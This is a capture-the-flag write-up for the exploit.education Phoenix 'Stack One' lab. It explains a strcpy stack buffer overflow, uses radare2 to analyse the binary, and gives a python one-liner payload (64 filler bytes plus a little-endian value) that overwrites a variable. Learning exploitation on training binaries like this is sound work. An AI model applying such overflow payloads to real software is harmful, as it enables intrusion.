# Stack 1

Write-up for: [https://exploit.education/phoenix/stack-one/](Stack One)

<!--more-->

I will omit the source code from now on. All future challenges will be approached from a black box perspective first to improve reversing skills. Also the source is available online (if exploit.education is down try wayback archive)

https://exploit.education/phoenix/stack-one/

This challenge is very similar to the previous one, it only requires a bit more precision in overflowing the buffer since a specific value is expected.

In this challenge, data is read via strcpy, using the first command line parameter as input. This call is unsafe and leads to a stack buffer overflow.

```
  strcpy(locals.buffer, argv[1]);
```

# Binary analysis

We can start off by looking at the binary using radare2:

```
radare2 stack-one
aa # analyze everything
s main
pD @ main

...
specify an argument, to be copied into the "buffer"" @ 0x804863c
...
ng_closer__changeme_is_currently_0x_08x__we_want_0x496c5962_n
...
```

Judging from these strings we can pass an argument to copy to a buffer. The is a variable called changeme which needs to be of a certain value.
Going from here, we would try to determine the length of the buffer. Various options exist: static analysis / RE, probing the binary or debugging it.

Since this is a very simple binary, let's skip the further analysis details.

The exploit:

```
user@phoenix-amd64:/opt/phoenix/i486$ ./stack-one `python -c 'print "A"*64 + "\x62\x59\x6c\x49"' `

Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

Note that the bytes in the payload are reversed to what we saw in the string due to the little-endian nature of the system.
